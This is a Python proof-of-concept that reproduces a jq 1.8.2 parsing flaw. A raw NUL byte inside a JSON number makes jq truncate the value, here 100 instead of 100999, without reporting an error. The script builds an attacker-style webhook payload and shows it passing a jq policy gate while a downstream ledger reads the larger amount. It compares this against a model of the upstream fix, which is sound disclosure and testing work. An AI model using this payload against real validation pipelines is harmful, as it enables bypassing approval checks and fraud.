#!/usr/bin/env python3
"""JqMimic — jq 1.8.2 silently truncates numeric JSON tokens at a raw NUL byte.

Drives the REAL released jq 1.8.2 Linux binary (bundled, SHA-256 pinned) against
a byte stream that is *not* valid RFC 8259 JSON:

    {"amount":100\x00999}          # raw 0x00 inside a number token

jq classifies 0x00 as an ordinary LITERAL character, appends it to the token
buffer, then reads that buffer as a C string in check_literal().  Everything
after the NUL vanishes, so jq reports 100 and exits 0 -- no parse error.

A jq-based policy gate therefore approves a value that a second consumer of the
same bytes (one that strips/ignores NULs, as text/ETL loaders routinely do)
reads as 100999.

Marker: JQMIMIC-CONFIRMED (printed only when the real binary misbehaves).
"""
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
JQ = os.path.join(HERE, "jq-1.8.2")
MARKER = "JQMIMIC-CONFIRMED"


def run_jq(args, data):
    return subprocess.run([JQ] + args, input=data,
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def jq_filter(data, filt):
    p = run_jq(["-c", filt], data)
    return p.returncode, p.stdout.decode("utf-8", "replace").strip(), \
        p.stderr.decode("utf-8", "replace").strip()


def fixed_reference(data):
    """Reference model of the upstream fix (commit fbee8f4, PR #3606): classify()
    now maps a raw NUL byte to INVALID, so the parser must report
    'Invalid character'.  This reproduces the single added case, not jq itself --
    it is the control, clearly labelled as such."""
    in_string = False
    esc = False
    for b in data:
        if in_string:
            if esc:
                esc = False
            elif b == 0x5C:            # backslash
                esc = True
            elif b == 0x22:            # closing quote
                in_string = False
            elif b < 0x20:             # jq rejects raw control chars in strings
                return "Invalid string"
        else:
            if b == 0x22:
                in_string = True
            elif b == 0x00:            # the fix: case '\\0': return INVALID
                return "Invalid character"
    return None


def main():
    if not (os.path.isfile(JQ) and os.access(JQ, os.X_OK)):
        print("missing bundled jq 1.8.2 binary at", JQ)
        return 2

    td = tempfile.mkdtemp(prefix="jqmimic-")
    payload = os.path.join(td, "webhook.json")
    # Attacker-controlled webhook body: amount 100999, but a raw NUL hides
    # everything after the first three digits from jq.
    raw = b'{"amount":100\x00999}'
    with open(payload, "wb") as f:
        f.write(raw)

    print("== 1. top-level number token with raw NUL ==")
    rc, out, err = jq_filter(b"100\x00999", ".")
    print("   input bytes : 31 30 30 00 39 39 39   ('100' NUL '999')")
    print("   jq .        : rc=%d stdout=%r stderr=%r" % (rc, out, err))
    top_truncated = (rc == 0 and out == "100")

    print("\n== 2. object field used by a policy gate ==")
    rc, out, err = jq_filter(raw, ".amount")
    print("   input bytes : %s" % " ".join("%02x" % b for b in raw))
    print("   jq .amount  : rc=%d stdout=%r stderr=%r" % (rc, out, err))
    field_truncated = (rc == 0 and out == "100")

    print("\n== 3. victim pipeline: jq gate + NUL-tolerant ledger ==")
    gate = run_jq(["-e", ".amount <= 100"], raw)
    print("   gate: jq -e '.amount <= 100' -> exit %d (%s)"
          % (gate.returncode, "APPROVED" if gate.returncode == 0 else "rejected"))
    # A second consumer of the same bytes: text/ETL loaders commonly delete NUL
    # padding before importing (tr -d '\\0', iconv, C-string readers, log shippers).
    ledger_bytes = raw.replace(b"\x00", b"")
    amount_field = ledger_bytes.split(b":")[1].rstrip(b"}")
    ledger_amount = int(amount_field)
    print("   ledger import (NULs stripped): amount = %d" % ledger_amount)
    bypass = (gate.returncode == 0 and ledger_amount > 100)

    print("\n== 4. control: same bytes through the fixed classify() rule ==")
    fixed = fixed_reference(raw)
    print("   fixed jq (NUL -> INVALID): %s" % (fixed or "accepted (unexpected)"))
    # and the unmodified positive control: well-formed JSON agrees everywhere
    good = b'{"amount":100}'
    grc, gout, _ = jq_filter(good, ".amount")
    gledger = int(good.split(b":")[1].rstrip(b"}"))
    print("   negative control {\"amount\":100}: jq=%r ledger=%d (agree)" % (gout, gledger))

    print("\n== verdict ==")
    if top_truncated and field_truncated and bypass and fixed == "Invalid character" \
            and grc == 0 and gout == "100" and gledger == 100:
        print("   jq 1.8.2 accepted RFC-invalid JSON (raw NUL), truncated the token to")
        print("   100, and the jq gate approved a record whose ledger value is 100999.")
        print(MARKER)
        return 0
    print("   expected behaviour not observed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
